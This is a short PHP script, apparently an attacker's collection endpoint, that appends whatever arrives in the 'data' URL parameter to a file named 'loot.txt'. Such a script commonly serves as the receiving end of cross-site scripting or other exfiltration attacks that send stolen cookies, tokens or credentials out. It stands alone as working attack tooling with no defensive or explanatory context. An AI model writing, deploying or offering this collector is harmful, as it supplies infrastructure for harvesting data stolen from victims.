<?php
	$file = fopen("loot.txt", "a");
	$data = $_GET['data'];
	fwrite($file, $data.PHP_EOL);
	fclose($file);
?>
